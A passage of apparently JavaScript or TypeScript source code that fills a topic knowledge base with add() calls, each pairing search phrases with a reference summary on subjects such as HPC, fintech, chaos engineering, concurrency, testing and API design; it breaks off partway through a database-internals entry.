  add('type_theory', ['formal verification program correctness safety liveness', 'abstract interpretation static analysis soundness', 'design by contract precondition postcondition invariant'],
    'Applied formal methods: Formal verification — prove program correctness mathematically. Safety properties (nothing bad happens), liveness properties (something good eventually happens). Techniques: deductive verification (Hoare logic, weakest precondition), symbolic execution, bounded model checking. Tools: Dafny, CBMC, Frama-C, KeY. Abstract interpretation: approximate program semantics for static analysis. Sound analysis (no false negatives) vs complete (no false positives). Domains: numerical (intervals, octagons, polyhedra), pointer analysis, taint analysis. Design by contract: preconditions, postconditions, class invariants (Eiffel, Ada SPARK, Kotlin contracts). Runtime verification: monitor properties during execution. Concurrency verification: deadlock detection, race condition analysis, linearizability checking.', 1.0)

  // ── Scientific Computing & HPC ───────────────────────────────────────────────
  add('scientific_computing', ['high performance computing hpc supercomputer cluster', 'parallel computing openmp thread simd vectorization', 'gpu computing cuda opencl nvidia tensor core'],
    'Scientific Computing & HPC: Parallel computing paradigms — shared memory (OpenMP, pthreads, TBB), distributed memory (MPI), GPU (CUDA, OpenCL, HIP). SIMD vectorization: AVX-512, NEON, auto-vectorization. Task parallelism vs data parallelism. GPU computing: CUDA (NVIDIA), ROCm (AMD), Tensor Cores (mixed-precision), CUDA kernels, shared memory, warp divergence. Libraries: cuBLAS, cuDNN, cuFFT, Thrust. OpenCL for heterogeneous. Supercomputers: TOP500 list, FLOPS benchmarking, Linpack. Cluster architectures: fat-tree, dragonfly, torus. Job schedulers: Slurm, PBS, LSF. Containers in HPC: Singularity/Apptainer, Shifter. Performance profiling: NVIDIA Nsight, Intel VTune, HPCToolkit, TAU.', 1.0)

  add('scientific_computing', ['mpi message passing interface distributed hpc', 'numerical methods finite element method simulation', 'hpc storage parallel file system lustre gpfs'],
    'HPC infrastructure: MPI — point-to-point (Send/Recv), collective (Broadcast, Reduce, AllReduce, Scatter, Gather), non-blocking communication, MPI I/O. Implementations: OpenMPI, MPICH, Intel MPI. Numerical methods: finite element method (FEM) for PDEs, finite difference, finite volume, spectral methods. Linear algebra: LAPACK, ScaLAPACK, PETSc, Trilinos. Solvers: direct (LU, Cholesky), iterative (CG, GMRES, multigrid). Monte Carlo methods, molecular dynamics, N-body simulations. HPC storage: parallel file systems (Lustre, GPFS/Spectrum Scale, BeeGFS), object storage, burst buffers. I/O libraries: HDF5, NetCDF, ADIOS2. Data management: staging, checkpoint/restart, in-situ visualization (ParaView Catalyst, VisIt LibSim).', 1.0)

  // ── FinTech & Payment Systems ────────────────────────────────────────────────
  add('fintech', ['payment processing gateway stripe square adyen pci dss', 'open banking psd2 api banking as a service baas', 'fintech financial technology digital banking neobank'],
    'FinTech & Payment Systems: Payment processing — merchant → payment gateway → payment processor → card network (Visa/Mastercard) → issuing bank. Gateways: Stripe, Square, Adyen, Braintree, PayPal. PCI DSS compliance: 12 requirements, SAQ levels, tokenization, P2PE. 3D Secure (3DS2) for card-not-present fraud prevention. Open Banking: PSD2 (EU), Open Banking Standard (UK), FDX (US). APIs: account information, payment initiation, confirmation of funds. Banking-as-a-Service (BaaS): Synapse, Marqeta, Galileo, Unit. Neobanks: Revolut, N26, Chime — mobile-first, no physical branches. Embedded finance: integrating financial services into non-financial platforms.', 1.0)

  add('fintech', ['lending credit scoring underwriting loan origination', 'algorithmic trading high frequency trading quantitative finance', 'kyc know your customer aml anti money laundering compliance'],
    'FinTech domains: Lending — credit scoring (FICO, VantageScore, alternative data), ML-based underwriting, loan origination systems, buy-now-pay-later (BNPL: Klarna, Affirm, Afterpay). P2P lending platforms. InsurTech: usage-based insurance (UBI), parametric insurance, claims automation, risk modeling. Algorithmic trading: quantitative strategies (mean reversion, momentum, stat arb), HFT (colocation, FPGA, market making), execution algorithms (TWAP, VWAP, iceberg). Risk management: VaR, stress testing, Monte Carlo simulation. Regulatory compliance: KYC (Know Your Customer), AML (Anti-Money Laundering), sanctions screening (OFAC), transaction monitoring. RegTech: automated compliance, regulatory reporting (XBRL), audit trails. Cryptocurrency: exchanges, custody, staking, DeFi protocols.', 1.0)

  // ── Healthcare IT & HIPAA ────────────────────────────────────────────────────
  add('healthcare_it', ['electronic health record ehr emr fhir hl7 interoperability', 'hipaa compliance protected health information phi', 'healthcare it medical informatics clinical system'],
    'Healthcare IT: EHR/EMR systems — Epic, Cerner (Oracle Health), Allscripts, Meditech. Interoperability standards: HL7 v2 (messaging), HL7 FHIR (RESTful API, JSON/XML resources: Patient, Observation, MedicationRequest), CDA (Clinical Document Architecture), DICOM (medical imaging). FHIR resources, search parameters, SMART on FHIR (OAuth2 for clinical apps). HIPAA compliance: Privacy Rule (PHI use/disclosure), Security Rule (administrative, physical, technical safeguards), Breach Notification Rule. PHI: 18 identifiers (name, DOB, SSN, medical record numbers). De-identification: Safe Harbor, Expert Determination. Business Associate Agreements (BAA). HITECH Act: meaningful use, health information exchange (HIE).', 1.0)

  add('healthcare_it', ['telemedicine telehealth remote patient monitoring wearable', 'clinical decision support system cdss diagnosis alert', 'medical imaging pacs radiology dicom ai diagnosis'],
    'Healthcare IT applications: Telemedicine — video consultations, asynchronous (store-and-forward), remote patient monitoring (RPM: wearables, IoT sensors, continuous glucose monitors). Platforms: Teladoc, Amwell, Doxy.me. Regulatory: state licensing, prescribing rules, reimbursement (CPT codes for telehealth). Clinical Decision Support (CDS): rule-based alerts, ML-assisted diagnosis, drug interaction checking, clinical pathways. CDS Hooks (HL7): real-time decision support triggers. Medical imaging IT: PACS (Picture Archiving and Communication System), RIS (Radiology Information System), VNA (Vendor Neutral Archive). AI in radiology: chest X-ray screening, mammography (CAD), pathology (digital slides). Health data analytics: population health, readmission prediction, clinical trials matching, pharmacovigilance, real-world evidence (RWE).', 1.0)

  // ── Graph Databases & Knowledge Graphs ───────────────────────────────────────
  add('graph_databases', ['graph database neo4j property graph cypher query language', 'rdf sparql knowledge graph ontology triple store', 'graph algorithm pagerank shortest path community detection'],
    'Graph Databases & Knowledge Graphs: Property graph model — nodes (entities), edges (relationships), properties (key-value on both). Neo4j (Cypher query language), Amazon Neptune, JanusGraph, ArangoDB (multi-model), TigerGraph. Cypher: MATCH, WHERE, RETURN, CREATE, MERGE patterns. Performance: index-free adjacency, traversal-optimized. RDF (Resource Description Framework): subject-predicate-object triples, URIs, literals. SPARQL query language. Triple stores: Apache Jena, Virtuoso, Blazegraph, Stardog. OWL ontologies, RDFS, SHACL validation. Graph algorithms: PageRank (centrality), shortest path (Dijkstra, BFS), community detection (Louvain, label propagation), betweenness centrality, connected components. Libraries: NetworkX (Python), igraph, Apache TinkerPop/Gremlin.', 1.0)

  add('graph_databases', ['knowledge graph construction entity extraction relation', 'graph neural network gnn node classification link prediction', 'graph visualization layout force directed hierarchical'],
    'Advanced graph topics: Knowledge graph construction — entity extraction (NER), relation extraction (RE), entity linking/disambiguation, knowledge base completion. Open KGs: Wikidata, DBpedia, YAGO, Freebase. Enterprise KGs: Google Knowledge Graph, Amazon Product Graph. Ontology design: classes, properties, inheritance, reasoning (OWL-DL). Graph Neural Networks: message passing, GCN (Graph Convolutional Network), GAT (Graph Attention), GraphSAGE, GIN. Tasks: node classification, link prediction, graph classification. Frameworks: PyTorch Geometric (PyG), DGL, Spektral. Graph visualization: force-directed layout (d3-force), hierarchical (Sugiyama), circular, geographic. Tools: Gephi, Cytoscape, Neo4j Browser/Bloom, GraphXR. Graph embeddings: node2vec, TransE, RotatE, ComplEx for knowledge graph embeddings.', 1.0)

  // ── Chaos Engineering & Resilience ───────────────────────────────────────────
  add('chaos_engineering', ['chaos engineering fault injection failure testing resilience', 'chaos monkey litmus gremlin toxiproxy fault injection tool', 'gameday exercise disaster recovery tabletop simulation'],
    'Chaos Engineering: Principles (Netflix) — build hypothesis about steady state, vary real-world events, run experiments in production, automate. Fault injection: network (latency, packet loss, partition), resource (CPU stress, memory pressure, disk fill), application (exception injection, dependency failure). Tools: Chaos Monkey (random instance termination), Litmus (Kubernetes-native), Gremlin (enterprise SaaS), Toxiproxy (network faults), Chaos Mesh (K8s), AWS Fault Injection Simulator. GameDay exercises: planned chaos experiments with stakeholders, runbooks, rollback procedures. Tabletop exercises: discussion-based, no actual injection. Disaster recovery testing: RTO (Recovery Time Objective), RPO (Recovery Point Objective). Blast radius control: start small, canary experiments, automated rollback.', 1.0)

  add('chaos_engineering', ['resilience pattern circuit breaker bulkhead retry fallback', 'steady state hypothesis error budget slo sli', 'observability chaos experiment metric anomaly detection'],
    'Resilience patterns: Circuit breaker (closed→open→half-open states, Hystrix, Resilience4j, Polly), bulkhead (isolate failures, limit concurrency), retry (exponential backoff, jitter, max attempts), fallback (graceful degradation, cached responses, default values), timeout (prevent hanging), rate limiter. Steady-state hypothesis: define normal behavior metrics before experiments — error rate, latency p99, throughput. Compare during/after chaos injection. Error budgets: SLI (Service Level Indicator), SLO (Service Level Objective), SLA (Service Level Agreement). Burn rate alerting. Observability for chaos: distributed tracing (correlate failures), metric anomaly detection during experiments, log aggregation for root cause. Progressive delivery: canary releases + chaos testing. Site reliability engineering integration: toil reduction, postmortems, blameless culture.', 1.0)

  // ── Advanced Algorithms & Data Structures ────────────────────────────────────
  add('advanced_algorithms', ['dynamic programming tabular memoization state transition knapsack lcs edit distance', 'graph algorithm dijkstra bellman ford floyd warshall minimum spanning tree topological sort', 'string algorithm kmp rabin karp suffix array trie aho corasick'],
    'Advanced Algorithms — Dynamic Programming: tabular bottom-up vs memoization top-down, state transition definition, overlapping subproblems + optimal substructure. Classic DP patterns: 0/1 knapsack (weight/value tradeoff), unbounded knapsack, LCS (longest common subsequence), edit distance (Levenshtein), matrix chain multiplication, coin change, longest increasing subsequence. Graph algorithms: Dijkstra (non-negative weights, priority queue O((V+E)logV)), A* (heuristic-guided, admissible heuristic), Bellman-Ford (negative weights, detects negative cycles O(VE)), Floyd-Warshall (all-pairs shortest path O(V³)), Kruskal/Prim MST, topological sort (DAG, Kahn BFS or DFS), Tarjan SCC (strongly connected components), Kosaraju SCC. String algorithms: KMP (failure function, O(n+m)), Rabin-Karp (rolling hash, expected O(n+m)), suffix arrays (O(n log n) construction, LCP array), tries (prefix tree, autocomplete), Aho-Corasick (multi-pattern matching, automaton).', 1.0)

  add('advanced_algorithms', ['probabilistic data structure bloom filter hyperloglog count min sketch skip list', 'advanced tree b tree red black segment tree fenwick binary indexed', 'divide conquer greedy algorithm merge sort quicksort huffman coding interval scheduling'],
    'Probabilistic Data Structures: Bloom filters (membership test, false positives, no false negatives, k hash functions, bit array), counting Bloom filter (deletion support), HyperLogLog (cardinality estimation, harmonic mean, ~1.6% standard error, Redis HLL), Count-Min sketch (frequency estimation, sub-linear space, point queries), skip lists (probabilistic balancing, O(log n) search/insert, Redis sorted sets). Advanced Trees: B-trees (disk-optimized, high branching factor, databases, O(log n) operations), B+ trees (leaf-linked, range queries), red-black trees (self-balancing BST, O(log n) guaranteed, Java TreeMap), AVL trees (stricter balancing), segment trees (range queries + point updates, lazy propagation, O(log n)), Fenwick/BIT (binary indexed tree, prefix sums, O(log n) update/query). Divide & Conquer: merge sort (stable O(n log n)), quicksort (expected O(n log n), Lomuto/Hoare partition), closest pair of points, Strassen matrix multiplication. Greedy algorithms: Huffman coding (optimal prefix-free codes), interval scheduling (earliest finish time), fractional knapsack, Kruskal MST, Dijkstra shortest path.', 1.0)

  // ── Concurrency & Parallelism Patterns ──────────────────────────────────────
  add('concurrency_patterns', ['actor model akka erlang message passing supervision tree mailbox', 'csp channels go channel clojure core async communicating sequential processes', 'lock free algorithm cas atomic operation aba problem compare and swap'],
    'Concurrency & Parallelism Patterns — Actor Model: lightweight isolated actors communicate via asynchronous message passing (no shared state), each actor has a mailbox (message queue), processes messages sequentially. Akka (JVM): actor hierarchy, supervision strategies (one-for-one, all-for-one), actor lifecycle (preStart, postStop, preRestart), clustering, persistence. Erlang/OTP: "let it crash" philosophy, supervisors, gen_server, gen_statem, ETS tables, lightweight processes (~2KB each, millions concurrent). CSP (Communicating Sequential Processes): Go channels (buffered/unbuffered, select statement, fan-in/fan-out, pipeline pattern), Clojure core.async (go blocks, channels, alts!), Kotlin coroutines channels. Lock-Free Algorithms: Compare-And-Swap (CAS, hardware atomic instruction), ABA problem (value changes A→B→A, solved via version tags/hazard pointers), lock-free queue (Michael-Scott queue), lock-free stack (Treiber stack), atomic operations (fetch-and-add, test-and-set), Java AtomicReference, C++ std::atomic.', 1.0)

  add('concurrency_patterns', ['memory model java jmm happens before acquire release sequential consistency', 'software transactional memory stm mvcc clojure ref atom agent', 'thread pool executor fork join work stealing structured concurrency virtual thread'],
    'Memory Models: Java Memory Model (JMM) — happens-before relationships (synchronized, volatile, thread start/join), visibility guarantees, instruction reordering, data races. C++ memory model: memory_order_seq_cst (strongest), memory_order_acquire/release (store-load ordering), memory_order_relaxed (no ordering). Sequential consistency: all operations appear in a single total order. Acquire-release semantics: release store synchronizes-with acquire load. Fences/barriers. Software Transactional Memory (STM): Clojure refs (dosync, alter, commute, ACI properties), atoms (uncoordinated synchronous), agents (asynchronous), MVCC (multi-version concurrency control, snapshot isolation, PostgreSQL/Oracle). Haskell STM (composable, retry, orElse). Thread Pools & Executors: fixed/cached/scheduled thread pools, Java ForkJoinPool (work-stealing, divide-and-conquer, recursive tasks), structured concurrency (Java 21 StructuredTaskScope, Python trio nurseries, Kotlin coroutineScope), virtual threads (Java 21 Project Loom, lightweight, millions of threads, carrier threads), Go goroutines + scheduler (M:N threading).', 1.0)

  // ── Reactive Programming ────────────────────────────────────────────────────
  add('reactive_programming', ['reactive stream rxjs rxjava project reactor observable operator subscription', 'backpressure strategy buffer drop throttle window debounce sample', 'functional reactive programming signal behavior push pull frp elm'],
    'Reactive Programming — Reactive Streams: standard for asynchronous stream processing with non-blocking backpressure (Publisher, Subscriber, Subscription, Processor). RxJS (JavaScript): Observable, Observer, operators (creation: of/from/interval, transformation: map/switchMap/mergeMap, filtering: filter/debounceTime/distinctUntilChanged, combination: merge/combineLatest/zip/forkJoin). RxJava (JVM): Flowable (backpressure-aware), Observable, Single, Maybe, Completable. Project Reactor: Mono (0-1 elements), Flux (0-N elements), Spring WebFlux integration. Backpressure Strategies: buffer (collect overflow, risk OOM), drop (discard excess), latest (keep newest), error (signal MissingBackpressureException), throttle/sample (time-based), window/buffer (batch by count/time). Functional Reactive Programming (FRP): signals (time-varying values), behaviors (continuous), events (discrete), push-based (eager evaluation), pull-based (lazy/demand-driven). Elm Architecture (Model-View-Update), Sodium FRP library.', 1.0)

  add('reactive_programming', ['reactive system reactive manifesto resilient elastic message driven responsive', 'reactive operator map flatmap switchmap merge combinlatest zip scan reduce', 'error handling reactive retry onerror circuit breaker timeout fallback recover'],
    'Reactive Systems (Reactive Manifesto): responsive (timely response), resilient (stay responsive during failure), elastic (stay responsive under varying workload), message-driven (asynchronous message passing, location transparency). Actor model + reactive streams = reactive systems. CQRS + event sourcing natural fit. Reactive Operators — Transformation: map (1:1), flatMap/mergeMap (1:many, concurrent), switchMap (cancel previous, latest only), concatMap (sequential), exhaustMap (ignore while busy). Combination: merge (interleave), combineLatest (latest from each), zip (pair-wise), withLatestFrom, forkJoin (wait all complete), scan (running accumulator), reduce (final accumulator). Error Handling in Reactive Streams: retry (resubscribe N times), retryWhen (conditional/delayed retry), onErrorReturn (fallback value), onErrorResumeNext (fallback stream), timeout (signal error after duration), circuit breaker pattern (Resilience4j + reactive), catchError/recover operators. Hot vs Cold observables: cold (unicast, replay from start), hot (multicast, miss past emissions), share/publish/refCount operators.', 1.0)

  // ── Metaprogramming & Code Generation ───────────────────────────────────────
  add('metaprogramming', ['runtime reflection java reflect python inspect dotnet reflection introspection metadata', 'compile time metaprogramming rust macro c++ template lisp macro hygiene', 'ast manipulation babel plugin typescript compiler api roslyn source generator'],
    'Metaprogramming & Code Generation — Runtime Reflection: Java Reflection API (Class.forName, getMethod, invoke, getDeclaredFields, setAccessible), performance cost (~50x slower), security manager restrictions. Python inspect module (getmembers, getsource, signature), __dict__, getattr/setattr/hasattr, metaclasses (__metaclass__, type()), descriptors (__get__/__set__). .NET Reflection (Assembly.GetTypes, MethodInfo.Invoke), System.Reflection.Emit (dynamic IL generation). Compile-Time Metaprogramming: Rust procedural macros (derive macros, attribute macros, function-like macros, TokenStream → TokenStream, syn/quote crates), declarative macros (macro_rules!, pattern matching). C++ templates (template metaprogramming, SFINAE, constexpr, concepts C++20, variadic templates). Lisp macros (homoiconicity, quasiquoting, macro hygiene, defmacro). AST Manipulation: Babel plugins (visitor pattern, @babel/traverse, @babel/types, @babel/generator), TypeScript Compiler API (ts.createProgram, transformers, type checker), Roslyn (.NET compiler platform, syntax trees, semantic model, code fixes, source generators).', 1.0)

  add('metaprogramming', ['code generation scaffolding yeoman plop template engine mustache handlebars', 'aspect oriented programming aop cross cutting concern spring aop postsharp proxy', 'decorator annotation python decorator java annotation typescript decorator metadata'],
    'Code Generation: scaffolding tools — Yeoman (generators, sub-generators, composability), Plop (micro-generator, Handlebars templates, actions), Hygen (template-based, prompt-driven). Template engines: Mustache (logic-less), Handlebars (helpers, partials), EJS (embedded JavaScript), Jinja2 (Python, filters, macros). OpenAPI/Swagger codegen (client/server stubs), GraphQL codegen (type-safe resolvers, hooks). protobuf/gRPC code generation. Aspect-Oriented Programming (AOP): cross-cutting concerns (logging, security, caching, transactions, error handling), join points (method execution, field access), pointcuts (matching expressions), advice (before, after, around). Spring AOP (proxy-based, @Aspect, @Before, @Around, @Pointcut), AspectJ (compile-time/load-time weaving, full AOP). PostSharp (.NET, compile-time IL weaving). Decorators & Annotations: Python decorators (@functools.wraps, decorator factories, class decorators, stacking), Java annotations (@Override, @Deprecated, custom annotations, retention policy, annotation processors), TypeScript decorators (experimental, class/method/property/parameter decorators, reflect-metadata, stage 3 proposal).', 1.0)

  // ── Micro Frontends ─────────────────────────────────────────────────────────
  add('micro_frontends', ['module federation webpack module federation import map dynamic remote shared dependency', 'micro frontend composition server side edge side client side iframe', 'shared state management custom event pub sub shared library cross app communication'],
    'Micro Frontends — Module Federation: Webpack 5 Module Federation plugin (exposes/remotes configuration, shared dependencies with version negotiation, singleton sharing), dynamic remotes (runtime URL resolution, A/B testing different remote versions), import maps (browser-native module resolution, SystemJS polyfill, Deno import maps), federated types (automatic TypeScript declaration sharing). Composition Patterns: server-side composition (SSI — Server Side Includes, Tailor by Zalando, Podium, fragment stitching at CDN/proxy level, better SEO), edge-side composition (ESI — Edge Side Includes, Cloudflare Workers, Lambda@Edge, lower latency), client-side composition (JavaScript orchestration, Web Components, iframes with postMessage, single-spa). Shared State Management: custom events (CustomEvent API, event bus pattern), pub/sub (RxJS Subject, EventEmitter), shared libraries (singleton stores, federated state modules), cross-app communication (BroadcastChannel API, postMessage, URL-based state, shared cookies/localStorage).', 1.0)

  add('micro_frontends', ['single spa framework parcel application root config lifecycle mount unmount', 'web component micro frontend shadow dom custom element slot encapsulation', 'micro frontend deployment independent deploy canary blue green versioning'],
    'Single-SPA Framework: root config (registerApplication, routes, layout engine), applications (lifecycle: bootstrap → mount → unmount → unload), parcels (framework-agnostic components, mountParcel/mountRootParcel), single-spa-layout (server-side and client-side layout definition), framework helpers (single-spa-react, single-spa-vue, single-spa-angular). Micro frontend design principles: team autonomy, independent deployment, technology agnostic, isolated failures. Web Components for Micro Frontends: Custom Elements (connectedCallback, disconnectedCallback, attributeChangedCallback, observedAttributes), Shadow DOM (style encapsulation, :host selector, ::slotted, shadow boundary), HTML templates and slots (named slots, default content, composition), Lit framework (reactive properties, declarative templates). Deployment Strategies: independent deployment (separate CI/CD pipelines, versioned assets on CDN), canary releases (traffic splitting per micro frontend), blue-green deployment (parallel environments, instant rollback), semantic versioning of shared contracts, feature flags per micro frontend, shared dependency CDN with fallbacks.', 1.0)

  // ── Refactoring & Code Smells ───────────────────────────────────────────────
  add('refactoring_patterns', ['code smell long method god class feature envy data clump primitive obsession shotgun surgery', 'refactoring technique extract method extract class move method replace conditional polymorphism', 'solid principle srp ocp lsp isp dip single responsibility open closed'],
    'Refactoring & Code Smells — Code Smells Catalog: Long Method (extract method, decompose conditional), God Class/Large Class (extract class, extract subclass), Feature Envy (move method to the class it envies), Data Clumps (introduce parameter object, extract class), Primitive Obsession (replace primitive with value object, replace type code with subclass/strategy), Shotgun Surgery (move method, inline class to consolidate), Divergent Change (extract class for each axis of change), Middle Man (remove middle man, inline delegate), Message Chains (hide delegate), Switch Statements (replace with polymorphism/strategy). Refactoring Techniques: Extract Method (isolate responsibility), Extract Class (SRP enforcement), Move Method/Field (feature envy resolution), Replace Conditional with Polymorphism (strategy/state pattern), Introduce Parameter Object (reduce long parameter lists), Replace Temp with Query (remove unnecessary variables), Compose Method (small cohesive steps). SOLID Principles Applied: SRP violations (class doing too much → extract), OCP strategies (extension points, plugins, strategy pattern), LSP contracts (subtypes must be substitutable, Liskov), ISP segregation (fat interface → role interfaces), DIP injection (depend on abstractions, IoC containers).', 1.0)

  add('refactoring_patterns', ['legacy code characterization test strangler fig branch by abstraction seam', 'technical debt management debt quadrant impact effort matrix refactoring sprint', 'anti pattern spaghetti code golden hammer premature optimization cargo cult lava flow'],
    'Legacy Code Strategies: characterization tests (capture existing behavior before refactoring, approval tests, golden master), strangler fig pattern (incrementally replace legacy with new system, route traffic progressively, façade layer), branch by abstraction (introduce abstraction layer, swap implementation behind it, feature toggles), seams (points where behavior can be altered without editing, object seams, link seams, preprocessing seams — Michael Feathers). Sprout method/class (add new functionality in new code, minimize legacy modifications). Technical Debt Management: debt quadrant (deliberate/inadvertent × reckless/prudent — Martin Fowler), impact/effort matrix (prioritize high-impact low-effort refactoring), refactoring sprints (dedicated time, measurable goals, Boy Scout rule — leave code better), code quality metrics (cyclomatic complexity, coupling, cohesion, code coverage, duplication ratio), SonarQube/CodeClimate dashboards. Anti-Patterns: spaghetti code (tangled control flow, no structure), golden hammer (using familiar tool for everything), premature optimization (Knuth: root of all evil, profile first), cargo cult programming (copying patterns without understanding), lava flow (dead code nobody dares remove), big ball of mud (no discernible architecture), boat anchor (unused code kept "just in case").', 1.0)

  // ── MLOps & Feature Engineering ─────────────────────────────────────────────
  add('mlops_engineering', ['ml pipeline kubeflow mlflow airflow metaflow feature training serving workflow', 'model registry mlflow model versioning ab testing shadow deployment staging', 'feature store feast tecton hopsworks online offline feature serving materialization'],
    'MLOps & Feature Engineering — ML Pipelines: end-to-end workflow orchestration (data ingestion → feature engineering → training → evaluation → deployment → monitoring). Kubeflow Pipelines (Kubernetes-native, DSL, components, caching), MLflow (tracking/projects/models/registry, language-agnostic), Apache Airflow (DAG-based scheduling, operators, sensors, XCom), Metaflow (Netflix, @step decorator, data versioning, AWS integration), ZenML (stack-based, integrations), Vertex AI Pipelines (Google Cloud). Model Registry: MLflow Model Registry (staging/production/archived stages, model versioning, annotations), model lineage tracking, A/B testing (traffic splitting, statistical significance, guardrail metrics), shadow deployment (mirror production traffic, compare predictions, no user impact), champion/challenger pattern, canary model deployment. Feature Stores: Feast (open-source, offline/online store, feature services, point-in-time joins), Tecton (managed, real-time features, streaming), Hopsworks (feature groups, training datasets, online/offline consistency), materialization (batch/streaming to online store), feature sharing across teams, feature freshness SLAs.', 1.0)

  add('mlops_engineering', ['data versioning dvc delta lake lakefs data lineage data pipeline reproducibility', 'experiment tracking mlflow tracking weights biases neptune hyperparameter tuning', 'model monitoring data drift concept drift model performance degradation retraining trigger'],
    'Data Versioning: DVC (Data Version Control — Git for data, remote storage backends S3/GCS/Azure, pipeline DAGs, metrics tracking), Delta Lake (ACID transactions on data lakes, time travel, schema evolution, Z-ordering), lakeFS (Git-like branching for data lakes, commits, merges, hooks), data lineage (track transformations from raw to features, impact analysis). Reproducibility: pinned dependencies, deterministic training, seed management, environment snapshots. Experiment Tracking: MLflow Tracking (runs, parameters, metrics, artifacts, auto-logging), Weights & Biases (experiment dashboards, hyperparameter sweeps, model/data versioning, reports), Neptune (metadata store, custom dashboards, integrations), hyperparameter tuning (grid search, random search, Bayesian optimization — Optuna/Hyperopt, early stopping). Model Monitoring: data drift detection (KL divergence, PSI — Population Stability Index, Kolmogorov-Smirnov test, Evidently AI, WhyLabs), concept drift (relationship between features and target changes), model performance degradation (accuracy/precision/recall decay, latency increase), retraining triggers (scheduled, drift-threshold, performance-threshold), A/B evaluation in production, feedback loops.', 1.0)

  // ── Advanced Testing Techniques ─────────────────────────────────────────────
  add('advanced_testing', ['property based testing quickcheck hypothesis fast check shrinking generator arbitrary', 'mutation testing pit stryker mutant infection killing mutation score indicator', 'fuzz testing afl libfuzzer coverage guided fuzzing corpus management seed input'],
    'Advanced Testing Techniques — Property-Based Testing: instead of specific examples, define properties that must hold for all inputs. QuickCheck (Haskell, original, random generation + shrinking), Hypothesis (Python, stateful testing, database of examples, profiles), fast-check (JavaScript/TypeScript, arbitrary combinators, model-based testing), jqwik (Java). Core concepts: generators/arbitraries (produce random inputs), properties (boolean predicates), shrinking (minimize failing case to simplest reproduction), coverage-guided generation. Mutation Testing: introduce small code changes (mutants) and verify tests catch them. Mutant operators: statement deletion, boolean negation, arithmetic operator replacement, conditional boundary changes, return value mutation. PIT/PITest (Java, bytecode mutation, incremental analysis), Stryker (JavaScript/C#/.NET, mutation switching), mutation score = killed mutants / total mutants. Surviving mutants reveal weak test coverage. Fuzz Testing: AFL (American Fuzzy Lop, coverage-guided, genetic algorithm, instrumentation), libFuzzer (in-process, LLVM-based, sanitizer integration), coverage-guided fuzzing (maximize code coverage, edge discovery), corpus management (seed inputs, minimize corpus, crash deduplication), OSS-Fuzz (continuous fuzzing for open source).', 1.0)

  add('advanced_testing', ['contract testing pact spring cloud contract consumer driven provider verification broker', 'formal specification tla+ alloy z notation model checking temporal logic invariant', 'chaos testing integration fault injection test toxiproxy resilience testing pattern'],
    'Contract Testing: consumer-driven contracts — consumer defines expectations, provider verifies compliance. Pact (polyglot, Pact Broker, webhook-triggered verification, can-i-deploy, bi-directional contracts), Spring Cloud Contract (JVM, Groovy/YAML DSL, auto-generated tests, stub runner), consumer-provider workflow (consumer writes contract → publish to broker → provider verifies → deploy independently). Provider verification: state management (provider states), pending pacts (WIP), versioning with Git SHA/tags. Formal Specification: TLA+ (Temporal Logic of Actions, Leslie Lamport, PlusCal algorithm language, TLC model checker, state space exploration), Alloy (relational logic, bounded model checking, visualizer, small scope hypothesis), Z notation (mathematical specification, schemas, predicate calculus), model checking (exhaustive state space search, temporal properties — liveness/safety, SPIN/Promela, NuSMV). Formal methods for distributed systems (consensus protocols, cache coherence). Chaos Testing Integration: fault injection in tests (deterministic failure simulation), Toxiproxy (simulate network conditions — latency, bandwidth, timeout, toxic types), resilience testing patterns (circuit breaker verification, retry exhaustion, timeout escalation, bulkhead isolation verification), WireMock fault simulation, Testcontainers + chaos.', 1.0)


  // ── API Design Patterns ──────────────────────────────────────────────────────
  add('api_patterns', ['rest best practices resource naming http methods status codes hateoas versioning', 'graphql schema design resolvers subscriptions fragments federation schema stitching', 'api gateway patterns rate limiting authentication load balancing circuit breaking'],
    'API Design Patterns — REST Best Practices: resource naming (plural nouns, hierarchical URIs /users/{id}/orders), HTTP methods (GET=read, POST=create, PUT=replace, PATCH=partial update, DELETE=remove), status codes (2xx success, 3xx redirect, 4xx client error, 5xx server error — 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 409 Conflict, 422 Unprocessable, 429 Too Many Requests, 500 Internal Server Error), HATEOAS (Hypermedia As The Engine Of Application State — links in responses for discoverability, HAL, JSON:API, Siren), versioning (URI path /v1/, header Accept-Version, content negotiation, semantic versioning). GraphQL Schema Design: type system (Object, Input, Enum, Interface, Union), resolvers (field-level resolution, DataLoader for N+1 problem, batching), subscriptions (WebSocket-based, pub/sub, filtering), fragments (reusable field selections, inline fragments), federation (Apollo Federation, subgraphs, gateway composition, @key directive), schema stitching (merge remote schemas, type merging, delegation). API Gateway: rate limiting (token bucket, sliding window, fixed window), authentication (API keys, OAuth2, JWT validation), load balancing (round-robin, least connections, weighted), circuit breaking (failure threshold, half-open state, fallback responses).', 1.0)

  add('api_patterns', ['api versioning strategies url path header query parameter content negotiation', 'api documentation openapi swagger asyncapi api blueprint postman specification', 'webhook design delivery guarantees retry policies signature verification idempotency'],
    'API Versioning Strategies: URL path versioning (/v1/resource — most common, explicit, easy routing), header versioning (Accept-Version, X-API-Version — cleaner URLs, harder to test), query parameter (?version=1 — easy to use, pollutes query string), content negotiation (Accept: application/vnd.api.v1+json — RESTful purist approach, complex), sunset headers (deprecation timeline, migration guides), backward compatibility (additive changes safe, removal needs versioning). API Documentation: OpenAPI/Swagger (specification 3.0/3.1, YAML/JSON schema, Swagger UI, Swagger Editor, code generation — openapi-generator, Redoc), AsyncAPI (event-driven API documentation, channels, messages, bindings for Kafka/AMQP/WebSocket), API Blueprint (Markdown-based, Apiary, Dredd testing), Postman (collections, environments, mock servers, documentation publishing, Newman CLI runner). Webhook Design: delivery guarantees (at-least-once with retries, idempotency keys for exactly-once processing), retry policies (exponential backoff, jitter, max retry limit, dead letter queue), signature verification (HMAC-SHA256, timestamp validation, replay attack prevention), idempotency (idempotency keys in headers, deduplication logic, idempotent receivers), webhook security (TLS, IP allowlisting, secret rotation), event payload design (envelope pattern, event type, timestamp, correlation ID).', 1.0)

  // ── Database Internals ───────────────────────────────────────────────────────
  add('database_internals', ['storage engines b-tree lsm tree page based log structured merge compaction', 'query optimization cost based optimizer join algorithms index selection query plans', 'transaction isolation levels read uncommitted committed repeatable read serializable mvcc'],
